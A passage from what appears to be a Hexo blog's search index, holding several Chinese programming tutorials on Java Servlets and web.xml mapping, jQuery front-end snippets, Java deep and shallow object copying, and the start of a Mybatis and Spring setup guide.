ServletConfig getServletConfig(); // 处理请求 public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException; // Returns information about the servlet, such as author, version, and copyright public String getServletInfo(); // 销毁 public void destroy();} 五个方法，从命名也可以看出对应的生命周期 首先是创建： init() 方法被创建 创建完毕之后，请求来了，分给 service方法，执行对应的业务逻辑 最后不想玩了，就销毁掉，此时触发 destroy方法 说明 在Servlet被创建后，服务器会马上调用Servlet的void init(ServletConfig)方法。请记住， Servlet出生后马上就会调用init()方法，我们可以把一些对Servlet的初始化工作放到init方法中，今后所有分配到这个Servlet的请求，都是公用这个Servlet的 4. ServletConfig init()方法的参数 ServletConfig对象对应web.xml文件中的元素。例如你想获取当前Servlet在web.xml文件中的配置名，那么可以使用servletConfig.getServletName()方法获取 1234String getServletName()：获取Servlet在web.xml文件中的配置名称，即指定的名称； ServletContext getServletContext()：用来获取ServletContext对象，ServletContext会在后面讲解； String getInitParameter(String name)：用来获取在web.xml中配置的初始化参数，通过参数名来获取参数值； Enumeration getInitParameterNames()：用来获取在web.xml中配置的所有初始化参数名称； 5. ServletRequest 请求对象，可以从其中获取请求数据，请求头等 内部提供的方法挺多，通常我们最关心的有: 获取参数: javax.servlet.ServletRequest#getParameter 获取头 : javax.servlet.http.HttpServletRequest#getHeader 获取cookie: javax.servlet.http.HttpServletRequest#getCookies 获取请求 : javax.servlet.http.HttpServletRequest#getRequestURI … 还有一个比较重要的就是指定字符编码，如我们通常要求提交的参数满足utf8编码，这时就可以如下设置 12// javax.servlet.ServletRequest#setCharacterEncodingrequest.setCharacterEncoding(&quot;utf-8&quot;); 如我们最常用的一个spring的fitler，关键代码如下 123456789101112131415// org.springframework.web.filter.CharacterEncodingFilter#doFilterInternal// @Overrideprotected void doFilterInternal( HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException { if (this.encoding != null &amp;&amp; (this.forceEncoding || request.getCharacterEncoding() == null)) { request.setCharacterEncoding(this.encoding); if (this.forceEncoding) { response.setCharacterEncoding(this.encoding); } } filterChain.doFilter(request, response);} 6. ServletResponse 返回对象，返回响应给调用方的结构，设置返回头 返回数据给调用方，主要就是利用这个东西了，内部提供的方法也不少，我们主要关心的其实也并不太多 设置返回头：javax.servlet.http.HttpServletResponse#setHeader 添加cookie: javax.servlet.http.HttpServletResponse#addCookie 重定向 : javax.servlet.http.HttpServletResponse#sendRedirect 异常 : javax.servlet.http.HttpServletResponse#sendError 设置ContentType: javax.servlet.ServletResponse#setContentType 设置返回流: javax.servlet.ServletResponse#getOutputStream, javax.servlet.ServletResponse#getWriter 设置编码: javax.servlet.ServletResponse#setCharacterEncoding II. 进阶1. web.xml中配置 这个配置，主要针对 Servlet 的顺序指定，URL匹配这两个问题，所以有必要研究下这个配置中的说明 通常web.xml的配置，下面两个是必须的 1234567891011121314&lt;!-- servlet的配置 --&gt;&lt;servlet&gt; &lt;!-- servlet的内部名称，自定义。尽量有意义 --&gt; &lt;servlet-name&gt;ServletDemo&lt;/servlet-name&gt; &lt;!-- servlet的类全名： 包名+简单类名 --&gt; &lt;servlet-class&gt;com.xxx.ServletDemo&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;!-- servlet的映射配置 --&gt;&lt;servlet-mapping&gt; &lt;!-- servlet的内部名称，一定要和上面的内部名称保持一致！！ --&gt; &lt;servlet-name&gt;ServletDemo&lt;/servlet-name&gt; &lt;!-- servlet的映射路径（访问servlet的名称） --&gt; &lt;url-pattern&gt;/servlet&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 其中 servlet-mapping 指定映射的路径，满足条件的会匹配对应的Servlet，匹配规则有以下几个定义 必须 / 开头 /servlet 表示精确匹配 http://localhost:8088/servlet 匹配 http://localhost:8088/servlets 不匹配 http://localhost:8088/servlet/123 不匹配 /servlet/* 表示目录匹配，所有servlet路径开头的都可以匹配 http://localhost:8088/servlet 匹配 http://localhost:8088/servlet/123 匹配 http://localhost:8088/servlet/123/123 匹配 http://localhost:8088/servlets 不匹配 /*.do 表示扩展名匹配，所有以 .do 结尾的匹配 既然这个url匹配支持模糊匹配，那么问题来了，如果两个servlet都匹配了这个path路径，那么到底是哪个处理呢？ 注意到前面有个配置参数：load-on-startup 当值为0或者大于0时，表示容器在应用启动时就加载这个servlet； 当是一个负数时或者没有指定时，则指示容器在该servlet被选择时才加载 正数的值越小，启动该servlet的优先级越高 注意 这个参数是加载顺序，而不是最终的匹配顺序 那么匹配顺序的优先级是： 精确路径匹配 比如servletA 的url-pattern为 /test，servletB的url-pattern为 /* ，这个时候，如果我访问的url为http://localhost/test ，这个时候容器就会先 进行精确路径匹配，发现/test正好被servletA精确匹配，那么就去调用servletA，也不会去理会其他的servlet了 最长路径匹配 servletA的url-pattern为/test/，而servletB的url-pattern为/test/a/，此时访问http://localhost/test/a时，容器会选择路径最长的servlet来匹配，也就是这里的servletB 扩展匹配，如果url最后一段包含扩展，容器将会根据扩展选择合适的servlet 如果前面三条规则都没有找到一个servlet，容器会根据url选择对应的请求资源，即匹配defaultServlet 2. 参数获取 参数获取，则主要区分get请求参数，post提交表单，上传的文件了 a. 通过 getQueryString这种获取参数的方式，只能获取url上面的参数，无法获取到post的表单内容 1String str = req.getQueryString(); b. 通过 getParameter12// 返回所有的请求参数javax.servlet.ServletRequest#getParameterMap 这种使用姿势，和我们在SpringMVC中常见的基本一致 c. 通过 getInputStream获取请求流，一般的使用姿势如下 1234InputStream stream = req.getInputStream();byte[] bytes = new byte[stream.available()];stream.read(bytes);String str = new String(bytes); 然后就需要自己对上面的请求参数进行处理了；两厢对比，常规的获取方法，直接使用 getParameter方式更加优雅 注意 通过getInputStream方式获取了请求数据之后，再通过 getParameter获取不到参数的，也好理解，请求的流，被你读取之后，其他的地方就无法获取流中的数据了 d. 获取上传的文件从请求参数中获取上传的文件，网上随意搜索了一下，发现大部分都使用apache的fileupload包， 其实处理的依然是inputstream这个请求流，只是逻辑比较复杂，粗略的翻看了一下源码，发现这一块还挺有意思的，准备单独的深入看一下 3. 数据返回返回数据，前面介绍HttpServletResponse的时候，就给出了两个方法 a. getWriter1public PrintWriter getWriter() throws IOException; b. getOutputStream1public ServletOutputStream getOutputStream() throws IOException; 下面简单说一下上面的区别 PrintWriter ServletOutputStream 字符流返回 字节流返回 需要字符编码 字节流直接返回（返回文件就很占优势了） 说明 上面两种方式互斥，只能使用其中一种case Servlet程序向ServletOutputStream或PrintWriter对象中写入的数据将被Servlet引擎获取，Servlet引擎将这些数据当作响应消息的正文，然后再与响应状态行和各响应头组合后输出到客户端 Serlvet的service方法结束后，Servlet引擎将检查getWriter或getOutputStream方法返回的输出流对象是否已经调用过close方法，如果没有，Servlet引擎将调用close方法关闭该输出流对象 4. 返回头设置常见的请求头和返回头设置，对于servlet而言也是比较常见的，一般常见的几个设置 是否缓存，缓存时间 设置cookie 设置 corss-origin 相关，以支持跨域 设置 content-type… 而实际的使用也比较简单了，如下即可 12# javax.servlet.http.HttpServletResponse#addHeaderresponse.addHeader(\"Content-Type\", \"text/html; charset=UTF-8\"); III. 实例测试创建一个自定义的嗯Servlet，然后拦截所有 /study 下面的请求 1234567891011121314151617public class DocServlet extends HttpServlet { protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.setCharacterEncoding(\"utf-8\"); PrintWriter writer = resp.getWriter(); writer.append(\"这是一个自定义servlet\") .append(\"emoj😄==\").flush(); System.out.println(\"hereher!!!!\"); } protected void doPost(HttpServletRequest req, HttpServletResponse res) throws IOException { Map map = req.getParameterMap(); System.out.println(\"arg: \" + map); res.getWriter().append(\"success\").flush(); }} 对应的xml配置如下 123456789 &lt;servlet&gt; &lt;servlet-name&gt;doc-servlet&lt;/servlet-name&gt; &lt;servlet-class&gt;com.yihui.study.DocServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;2&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;doc-servlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/study/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 实测演示： IV. 其他参考 servlet详解(第一篇) 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/01/24/JavaWeb三大组件之Servlet学习/"},{"title":"JQuery 实战笔记一","text":"jquery实战笔记写前端控制台中，实际遇到的不会的，通过查询解决的记录，汇总记录下来，一期主要包括： 标签隐藏显示 时间戳转换 radio单选框选中获取 动态修改placeholder值 判断字符串是否为数字类型 tab标签页实现 标签点击事件 jquery跳转链接 jquery 修改图片url 图片加边框 实现一个可检索的table 表格内容固定 input回车响应 1. jquery控制div标签的显示隐藏123&lt;div id=\"queryExtend\"&gt; &lt;label&gt; hah &lt;/label&gt;&lt;/div jquery的用法, 判断是否隐藏，是则显示；否则隐藏 1234567function showQueryCondition() { if($('#queryExtend').is(\":hidden\")) { $('#queryExtend').show(); } else { $('#queryExtend').hide(); }} 2. 时间戳转日期1234// 获取当前时间戳var ns = Date.parse(new Date())/1000;var timestamp4 = new Date(parseInt(nS) * 1000);return timestamp4.toLocaleDateString().replace(/\\//g, \"/\") + \" \" + timestamp4.toTimeString().substr(0, 8); 3. 获取radio群的值123456789101112&lt;div class=\"col-md-10 input-group input-group-lg\"&gt; &lt;div class=\"col-md-2\"&gt; &lt;input type=\"radio\" name=\"queryType\" id=\"queryType\" value=\"1\" checked/&gt; &amp;nbsp;&amp;nbsp; 默认 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/div&gt; &lt;div class=\"col-md-2\"&gt; &lt;input type=\"radio\" name=\"queryType\" id=\"queryType\" value=\"2\"/&gt; &amp;nbsp;&amp;nbsp; 查主库 &lt;/div&gt; &lt;div class=\"col-md-2\"&gt; &lt;input type=\"radio\" name=\"queryType\" id=\"queryType\" value=\"3\"/&gt; &amp;nbsp;&amp;nbsp; 查从库 &lt;/div&gt;&lt;/div&gt; 对应的jquery获取选中值 1var queryDB = $(\"input[name='queryType']:checked\").val(); 4. 动态修改placeholder值1$('#itemId').attr('placeholder', '请输入商品ID '); 5. 判断字符串是否为数字类型123456var str = \"37\";var n = Number(str);if (!isNaN(n)){ alert(\"是数字\");} 6. tab标签页的实现12345678910111213141516171819202122232425262728293031323334&lt;ul id=\"myTab\" class=\"nav nav-tabs\"&gt; &lt;li class=\"active\"&gt; &lt;a href=\"#home\" data-toggle=\"tab\"&gt; 菜鸟教程 &lt;/a&gt; &lt;/li&gt; &lt;li&gt;&lt;a href=\"#ios\" data-toggle=\"tab\"&gt;iOS&lt;/a&gt;&lt;/li&gt; &lt;li class=\"dropdown\"&gt; &lt;a href=\"#\" id=\"myTabDrop1\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"&gt;Java &lt;b class=\"caret\"&gt;&lt;/b&gt; &lt;/a&gt; &lt;ul class=\"dropdown-menu\" role=\"menu\" aria-labelledby=\"myTabDrop1\"&gt; &lt;li&gt;&lt;a href=\"#jmeter\" tabindex=\"-1\" data-toggle=\"tab\"&gt;jmeter&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#ejb\" tabindex=\"-1\" data-toggle=\"tab\"&gt;ejb&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt;&lt;/ul&gt;&lt;div id=\"myTabContent\" class=\"tab-content\"&gt; &lt;div class=\"tab-pane fade in active\" id=\"home\"&gt; &lt;p&gt;菜鸟教程是一个提供最新的web技术站点，本站免费提供了建站相关的技术文档，帮助广大web技术爱好者快速入门并建立自己的网站。菜鸟先飞早入行——学的不仅是技术，更是梦想。&lt;/p&gt; &lt;/div&gt; &lt;div class=\"tab-pane fade\" id=\"ios\"&gt; &lt;p&gt;iOS 是一个由苹果公司开发和发布的手机操作系统。最初是于 2007 年首次发布 iPhone、iPod Touch 和 Apple TV。iOS 派生自 OS X，它们共享 Darwin 基础。OS X 操作系统是用在苹果电脑上，iOS 是苹果的移动版本。&lt;/p&gt; &lt;/div&gt; &lt;div class=\"tab-pane fade\" id=\"jmeter\"&gt; &lt;p&gt;jMeter 是一款开源的测试软件。它是 100% 纯 Java 应用程序，用于负载和性能测试。&lt;/p&gt; &lt;/div&gt; &lt;div class=\"tab-pane fade\" id=\"ejb\"&gt; &lt;p&gt;Enterprise Java Beans（EJB）是一个创建高度可扩展性和强大企业级应用程序的开发架构，部署在兼容应用程序服务器（比如 JBOSS、Web Logic 等）的 J2EE 上。 &lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 借助bootstrap，主要点 myTab 标签表示的导航内容 href 指向的本标签对应的内容 myTagContent 对应的标签页内容 id 与 导航的锚点对应 class=&quot;tab-pane fade in active&quot; 表示生效的标签内容 class=&quot;tab-pane fade&quot; 未激活的标签属性 7. 标签点击事件1$('#btn').click(function(){}); 8. jquery跳转链接12345678910// 本页面直接打开urlwindow.location.href=url;// 新标签页打开urlwindow.open(url, \"_blank\")// 在demo窗口打开urlwindow.open(url, \"demo\"); 9. jquery 修改图片url1$('#img').attr(\"src\", newImgUrl); 10. 图片加边框1&lt;image id=\"data\" style=\"border:1px solid #b5b3b3;\"/&gt; 11. 实现一个可检索的table在一个bootstrap项目中，必要的 jquery, bootstrap.min.js需要依赖 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;div id=\"wrapper\"&gt;&lt;div class=\"row\"&gt; &lt;div class=\"col-lg-12\"&gt; &lt;div class=\"ibox float-e-margins\"&gt; &lt;div class=\"ibox-content\"&gt; &lt;input type=\"text\" class=\"form-control input-sm m-b-xs\" id=\"filter\" placeholder=\"Search in table\"&gt; &lt;table class=\"footable table table-stripped\" data-page-size=\"8\" data-filter=#filter&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;Rendering engine&lt;/th&gt; &lt;th&gt;Browser&lt;/th&gt; &lt;th data-hide=\"phone,tablet\"&gt;Platform(s)&lt;/th&gt; &lt;th data-hide=\"phone,tablet\"&gt;Engine version&lt;/th&gt; &lt;th data-hide=\"phone,tablet\"&gt;CSS grade&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr class=\"gradeX\"&gt; &lt;td&gt;Trident&lt;/td&gt; &lt;td&gt;Internet Explorer 4.0 &lt;/td&gt; &lt;td&gt;Win 95+&lt;/td&gt; &lt;td class=\"center\"&gt;4&lt;/td&gt; &lt;td class=\"center\"&gt;X&lt;/td&gt; &lt;/tr&gt; &lt;tr class=\"gradeC\"&gt; &lt;td&gt;Trident&lt;/td&gt; &lt;td&gt;Internet Explorer 5.0 &lt;/td&gt; &lt;td&gt;Win 95+&lt;/td&gt; &lt;td class=\"center\"&gt;5&lt;/td&gt; &lt;td class=\"center\"&gt;C&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;tfoot&gt; &lt;tr&gt; &lt;td colspan=\"5\"&gt; &lt;ul class=\"pagination pull-right\"&gt;&lt;/ul&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tfoot&gt; &lt;/table&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;script src=\"http://s11.mogucdn.com/mlcdn/c45406/1512464758975_footable.all.min.js\"&gt;&lt;/script&gt;&lt;script&gt; $(document).ready(function() { $('.footable').footable(); $('.footable2').footable(); });&lt;/script&gt; 12. 表格内容固定1&lt;td style=\"word-break:break-all;width:20%\"&gt;dc:650|tp:1|ci:700004593373|st:1481299200|mk:9|ws:1480694400|et:1481558399|nm:活动价|&lt;/td&gt; 13. input回车响应12345678910111213141516171819202122232425262728293031323334353637383940414243444546$('#applyCertNum').bind('keypress',function(event){ if(event.keyCode == 13) { alert('你输入的内容为1：' + $('#applyCertNum').val()); } }); 2.方法2$('#applyCertNum').on('keypress',function(event){ if(event.keyCode == 13) { alert('你输入的内容为1：' + $('#applyCertNum').val()); } }); 3.方法3$('#applyCertNum').bind('keypress',function(event){ if(event.keyCode == \"13\") { alert('你输入的内容为2：' + $('#applyCertNum').val()); } });4.方法4$(\"#applyCertNum\").keydown(function(e) { if (e.keyCode == 13) { alert(\"12345....\"); } }); html中直接加入 1onkeydown=\"if(event.keyCode==13) {queryAppAuthList();}\" II. 其他个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/08/JQuery-实战笔记一/"},{"title":"Java学习之深拷贝浅拷贝及对象拷贝的两种方式","text":"I. Java之Clone0. 背景对象拷贝，是一个非常基础的内容了，为什么会单独的把这个领出来讲解，主要是先前遇到了一个非常有意思的场景 有一个任务，需要解析类xml标记语言，然后生成document对象，之后将会有一系列针对document对象的操作 通过实际的测试，发现生成Document对象是比较耗时的一个操作，再加上这个任务场景中，需要解析的xml文档是固定的几个，那么一个可以优化的思路就是能不能缓存住创建后的Document对象，在实际使用的时候clone一份出来 1. 内容说明看到了上面的应用背景，自然而言的就会想到深拷贝了，本篇博文则主要内容如下 介绍下两种拷贝方式的区别 深拷贝的辅助工具类 如何自定义实现对象拷贝 II. 深拷贝和浅拷贝0. 定义说明深拷贝 相当于创建了一个新的对象，只是这个对象的所有内容，都和被拷贝的对象一模一样而已，即两者的修改是隔离的，相互之间没有影响 浅拷贝 也是创建了一个对象，但是这个对象的某些内容（比如A）依然是被拷贝对象的，即通过这两个对象中任意一个修改A，两个对象的A都会受到影响 看到上面两个简单的说明，那么问题来了 浅拷贝中，是所有的内容公用呢？还是某些内容公用？ 从隔离来将，都不希望出现浅拷贝这种方式了，太容易出错了，那么两种拷贝方式的应用场景是怎样的？ 1. 浅拷贝一般来说，浅拷贝方式需要实现Cloneable接口，下面结合一个实例，来看下浅拷贝中哪些是独立的，哪些是公用的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@Datapublic class ShallowClone implements Cloneable { private String name; private int age; private List&lt;String&gt; books; public ShallowClone clone() { ShallowClone clone = null; try { clone = (ShallowClone) super.clone(); } catch (CloneNotSupportedException e) { e.printStackTrace(); } return clone; } public static void main(String[] args) { ShallowClone shallowClone = new ShallowClone(); shallowClone.setName(\"SourceName\"); shallowClone.setAge(28); List&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"java\"); list.add(\"c++\"); shallowClone.setBooks(list); ShallowClone cloneObj = shallowClone.clone(); // 判断两个对象是否为同一个对象（即是否是新创建了一个实例） System.out.println(shallowClone == cloneObj); // 修改一个对象的内容是否会影响另一个对象 shallowClone.setName(\"newName\"); shallowClone.setAge(20); shallowClone.getBooks().add(\"javascript\"); System.out.println(\"source: \" + shallowClone.toString() + \"\\nclone:\" + cloneObj.toString()); shallowClone.setBooks(Arrays.asList(\"hello\")); System.out.println(\"source: \" + shallowClone.toString() + \"\\nclone:\" + cloneObj.toString()); }} 输出结果: 12345falsesource: ShallowClone(name=newName, age=20, books=[java, c++, javascript])clone:ShallowClone(name=SourceName, age=28, books=[java, c++, javascript])source: ShallowClone(name=newName, age=20, books=[hello])clone:ShallowClone(name=SourceName, age=28, books=[java, c++, javascript]) 结果分析： 拷贝后获取的是一个独立的对象，和原对象拥有不同的内存地址 基本元素类型，两者是隔离的（虽然上面只给出了int，String） 基本元素类型包括: int, Integer, long, Long, char, Charset, byte,Byte, boolean, Boolean, float,Float, double, Double, String 非基本数据类型（如基本容器，其他对象等），只是拷贝了一份引用出去了，实际指向的依然是同一份 其实，浅拷贝有个非常简单的理解方式： 浅拷贝的整个过程就是，创建一个新的对象，然后新对象的每个值都是由原对象的值，通过 = 进行赋值 这个怎么理解呢？ 上面的流程拆解就是： 1234- Object clone = new Object();- clone.a = source.a- clone.b = source.b- ... 那么=赋值有什么特点呢？ 基本数据类型是值赋值；非基本的就是引用赋值 2. 深拷贝深拷贝，就是要创建一个全新的对象，新的对象内部所有的成员也都是全新的，只是初始化的值已经由被拷贝的对象确定了而已 那么上面的实例改成深拷贝应该是怎样的呢？ 可以加上这么一个方法 1234567891011121314151617181920212223242526272829303132333435363738public ShallowClone deepClone() { ShallowClone clone = new ShallowClone(); clone.name = this.name; clone.age = this.age; if (this.books != null) { clone.books = new ArrayList&lt;&gt;(this.books); } return clone;}// 简单改一下测试casepublic static void main(String[] args) { ShallowClone shallowClone = new ShallowClone(); shallowClone.setName(\"SourceName\"); shallowClone.setAge(new Integer(1280)); List&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"java\"); list.add(\"c++\"); shallowClone.setBooks(list); ShallowClone cloneObj = shallowClone.deepClone(); // 判断两个对象是否为同一个对象（即是否是新创建了一个实例） System.out.println(shallowClone == cloneObj); // 修改一个对象的内容是否会影响另一个对象 shallowClone.setName(\"newName\"); shallowClone.setAge(2000); shallowClone.getBooks().add(\"javascript\"); System.out.println(\"source: \" + shallowClone.toString() + \"\\nclone:\" + cloneObj.toString()); shallowClone.setBooks(Arrays.asList(\"hello\")); System.out.println(\"source: \" + shallowClone.toString() + \"\\nclone:\" + cloneObj.toString());} 输出结果为： 12345falsesource: ShallowClone(name=newName, age=2000, books=[java, c++, javascript])clone:ShallowClone(name=SourceName, age=1280, books=[java, c++])source: ShallowClone(name=newName, age=2000, books=[hello])clone:ShallowClone(name=SourceName, age=1280, books=[java, c++]) 结果分析： 深拷贝独立的对象 拷贝后对象的内容，与原对象的内容完全没关系，都是独立的 简单来说，深拷贝是需要自己来实现的，对于基本类型可以直接赋值，而对于对象、容器、数组来讲，需要创建一个新的出来，然后重新赋值 3. 应用场景区分深拷贝的用途我们很容易可以想见，某个复杂对象创建比较消耗资源的时候，就可以缓存一个蓝本，后续的操作都是针对深clone后的对象，这样就不会出现混乱的情况了 那么浅拷贝呢？感觉留着是一个坑，一个人修改了这个对象的值，结果发现对另一个人造成了影响，真不是坑爹么？ 假设又这么一个通知对象长下面这样 12345private String notifyUser;// xxxprivate List&lt;String&gt; notifyRules; 我们现在随机挑选了一千个人，同时发送通知消息，所以需要创建一千个上面的对象，这些对象中呢，除了notifyUser不同，其他的都一样 在发送之前，突然发现要临时新增一条通知信息，如果是浅拷贝的话，只用在任意一个通知对象的notifyRules中添加一调消息，那么这一千个对象的通知消息都会变成最新的了；而如果你是用深拷贝，那么苦逼的得遍历这一千个对象，每个都加一条消息了 III. 对象拷贝工具上面说到，浅拷贝，需要实现Clonebale接口，深拷贝一般需要自己来实现，那么我现在拿到一个对象A，它自己没有提供深拷贝接口，我们除了主动一条一条的帮它实现之外，有什么辅助工具可用么？ 对象拷贝区别与clone，它可以支持两个不同对象之间实现内容拷贝 Apache的两个版本：（反射机制） 1234org.apache.commons.beanutils.PropertyUtils.copyProperties(Object dest, Object orig)org.apache.commons.beanutils.BeanUtils#cloneBean Spring版本：（反射机制） 1org.springframework.beans.BeanUtils.copyProperties(Object source, Object target, Class editable, String[] ignoreProperties) cglib版本：（使用动态代理，效率高） 1net.sf.cglib.beans.BeanCopier.copy(Object paramObject1, Object paramObject2, Converter paramConverter) 从上面的几个有名的工具类来看，提供了两种使用者姿势，一个是反射，一个是动态代理，下面分别来看两种思路 1. 借助反射实现对象拷贝通过反射的方式实现对象拷贝的思路还是比较清晰的，先通过反射获取对象的所有属性，然后修改可访问级别，然后赋值；再获取继承的父类的属性，同样利用反射进行赋值 上面的几个开源工具，内部实现封装得比较好，所以直接贴源码可能不太容易一眼就能看出反射方式的原理，所以简单的实现了一个, 仅提供思路 123456789101112131415161718192021222324252627282930313233343536373839404142434445public static void copy(Object source, Object dest) throws Exception { Class destClz = dest.getClass(); // 获取目标的所有成员 Field[] destFields = destClz.getDeclaredFields(); Object value; for (Field field : destFields) { // 遍历所有的成员，并赋值 // 获取value值 value = getVal(field.getName(), source); field.setAccessible(true); field.set(dest, value); }}private static Object getVal(String name, Object obj) throws Exception { try { // 优先获取obj中同名的成员变量 Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); return field.get(obj); } catch (NoSuchFieldException e) { // 表示没有同名的变量 } // 获取对应的 getXxx() 或者 isXxx() 方法 name = name.substring(0, 1).toUpperCase() + name.substring(1); String methodName = \"get\" + name; String methodName2 = \"is\" + name; Method[] methods = obj.getClass().getMethods(); for (Method method : methods) { // 只获取无参的方法 if (method.getParameterCount() &gt; 0) { continue; } if (method.getName().equals(methodName) || method.getName().equals(methodName2)) { return method.invoke(obj); } } return null;} 上面的实现步骤还是非常清晰的，首先是找同名的属性，然后利用反射获取对应的值 123Field field = obj.getClass().getDeclaredField(name);field.setAccessible(true);return field.get(obj); 如果找不到，则找getXXX, isXXX来获取 2. 代理的方式实现对象拷贝Cglib的BeanCopier就是通过代理的方式实现拷贝，性能优于反射的方式，特别是在大量的数据拷贝时，比较明显 代理，我们知道可以区分为静态代理和动态代理，简单来讲就是你要操作对象A，但是你不直接去操作A，而是找一个中转porxyA, 让它来帮你操作对象A 那么这种技术是如何使用在对象拷贝的呢？ 我们知道，效率最高的对象拷贝方式就是Getter/Setter方法了，前面说的代理的含义指我们不直接操作，而是找个中间商来赚差价，那么方案就出来了 将原SourceA拷贝到目标DestB 创建一个代理 copyProxy 在代理中，依次调用 SourceA的get方法获取属性值，然后调用DestB的set方法进行赋值 实际上BeanCopier的思路大致如上，具体的方案当然就不太一样了, 简单看了一下实现逻辑，挺有意思的一块，先留个坑，后面单独开个博文补上 说明 从实现原理和通过简单的测试，发现BeanCopier是扫描原对象的getXXX方法，然后赋值给同名的 setXXX 方法，也就是说，如果这个对象中某个属性没有get/set方法，那么就无法赋值成功了 IV. 小结1. 深拷贝和浅拷贝深拷贝 相当于创建了一个新的对象，只是这个对象的所有内容，都和被拷贝的对象一模一样而已，即两者的修改是隔离的，相互之间没有影响 完全独立 浅拷贝 也是创建了一个对象，但是这个对象的某些内容（比如A）依然是被拷贝对象的，即通过这两个对象中任意一个修改A，两个对象的A都会受到影响 等同与新创建一个对象，然后使用=，将原对象的属性赋值给新对象的属性 需要实现Cloneable接口 2. 对象拷贝的两种方法通过反射方式实现对象拷贝 主要原理就是通过反射获取所有的属性，然后反射更改属性的内容 通过代理实现对象拷贝 将原SourceA拷贝到目标DestB 创建一个代理 copyProxy在代理中，依次调用 SourceA的get方法获取属性值，然后调用DestB的set方法进行赋值 V. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2017/12/17/Java学习之深拷贝浅拷贝及对象拷贝的两种方式/"},{"title":"Mybatis框架学习之使用篇一：基本环境","text":"Mybatis框架学习之使用篇主要介绍如何使用mybatis，来实现db的增删改查，通常mybatis一般是结合spring来使用，因此我们也不脱离这个大环境 主要内容将包括以下： 环境配置相关 Dao文件与xml的映射（接口绑定有两种，xml和注解方式，这里以xml方式进行说明） 增删改查的写法 常用命令 choose, if, set, …. #，$两种方式的区别 I. 前提准备在开始之前，先得准备好对应的环境，首先建立一个可有效运行的环境 依赖配置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!-- mybatis 依赖--&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.4.5&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.35&lt;/version&gt;&lt;/dependency&gt;&lt;!-- druid数据源 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.6&lt;/version&gt;&lt;/dependency&gt;&lt;!-- spring 依赖相关--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 单测相关 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;5.0.2.RELEASE&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; 这里采用druid来进行数据源的管理，目前仅作为一个使用工具，不深入探究 接下来就是xml的配置，如我们常见的jdbc链接相关的配置信息，一个demo如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean class=\"org.springframework.beans.factory.config.PropertyPlaceholderConfigurer\"&gt; &lt;property name=\"locations\"&gt; 